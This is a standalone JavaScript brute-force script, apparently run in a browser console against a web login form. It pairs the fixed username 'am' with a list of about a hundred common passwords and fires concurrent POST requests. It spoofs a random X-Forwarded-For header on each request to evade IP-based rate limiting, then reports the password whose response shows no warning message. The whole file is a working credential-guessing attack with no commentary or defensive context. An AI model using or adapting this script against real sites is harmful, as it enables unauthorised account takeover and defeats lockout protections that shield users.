const passwords = [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "123123",
    "baseball",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "1234567890",
    "michael",
    "654321",
    "superman",
    "1qaz2wsx",
    "7777777",
    "121212",
    "000000",
    "qazwsx",
    "123qwe",
    "killer",
    "trustno1",
    "jordan",
    "jennifer",
    "zxcvbnm",
    "asdfgh",
    "hunter",
    "buster",
    "soccer",
    "harley",
    "batman",
    "andrew",
    "tigger",
    "sunshine",
    "iloveyou",
    "2000",
    "charlie",
    "robert",
    "thomas",
    "hockey",
    "ranger",
    "daniel",
    "starwars",
    "klaster",
    "112233",
    "george",
    "computer",
    "michelle",
    "jessica",
    "pepper",
    "1111",
    "zxcvbn",
    "555555",
    "11111111",
    "131313",
    "freedom",
    "777777",
    "pass",
    "maggie",
    "159753",
    "aaaaaa",
    "ginger",
    "princess",
    "joshua",
    "cheese",
    "amanda",
    "summer",
    "love",
    "ashley",
    "nicole",
    "chelsea",
    "biteme",
    "matthew",
    "access",
    "yankees",
    "987654321",
    "dallas",
    "austin",
    "thunder",
    "taylor",
    "matrix",
    "mobilemail",
    "mom",
    "monitor",
    "monitoring",
    "montana",
    "moon",
    "moscow",
]

const correctUsername = "am"

let formData = new FormData()
formData.set("username", correctUsername)

const url = window.location.href

let statusAndError = []

for(let i = 0; i < passwords.length; i++) {
    const password = passwords[i]
    formData.set("password", password)
    statusAndError.push(
        fetch(url, {
            method: 'POST',
            body: formData,
            headers: {
                'X-Forwarded-For': Math.floor(Math.random() * 10000000000) + 1
            }
        })
        .then(async (res) => {
            const status = res.status
            
            res = await res.text()
            let html = document.createElement("html")
            html.innerHTML = res

            let error = html.getElementsByClassName("is-warning")
            error = (error.length > 0) ? error[0].innerText : ""

            return {
                status: status,
                error: error
            }
        })  
    )
}

statusAndError = await Promise.all(statusAndError)
let passwdIdx = undefined;
for(let i = 0; i < statusAndError.length; i++) {
    if(statusAndError[i].error == "") {
        // Successful attempt will not generate any error
        passwdIdx = i;
        break;
    }
}

console.log("Correct password: " + passwords[passwdIdx])